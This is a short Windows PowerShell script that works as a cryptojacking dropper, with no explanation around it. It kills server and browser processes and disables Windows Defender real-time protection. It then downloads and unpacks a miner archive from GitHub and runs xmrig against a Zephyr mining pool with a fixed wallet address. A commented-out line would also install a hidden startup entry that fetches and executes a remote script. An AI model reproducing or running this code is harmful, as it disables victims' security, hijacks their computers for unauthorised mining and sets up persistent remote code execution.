taskkill /IM sqlservr.exe /F
taskkill /IM w3wp.exe /F
taskkill /IM msedge.exe /F
taskkill /IM Batch.exe /F
Set-MpPreference -DisableRealtimeMonitoring $true
# Write-Output 'cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass "irm hhttps://raw.githubusercontent.com/zlc1004/autominer/refs/heads/main/miner.ps1 | iex"' > "$Env:USERPROFILE\Start Menu\Programs\Startup\run.cmd"
Invoke-WebRequest "https://github.com/zlc1004/autominer/raw/refs/heads/main/miner.zip" -OutFile $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip
Expand-Archive $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip -DestinationPath $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner -Force
Set-Location $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner\miner
./xmrig.exe --donate-level 1 -o de.zephyr.herominers.com:1123 -u ZEPHYR3V5B67MsjgqLpregJeTXRdR24i7HsW4sb8jHrN9KQ8PxJ7keU82Zo4BYJy1n86GHSerF4yPZLBVk52XikzdRg795sPJsn4F -p server -a rx/0 -k 
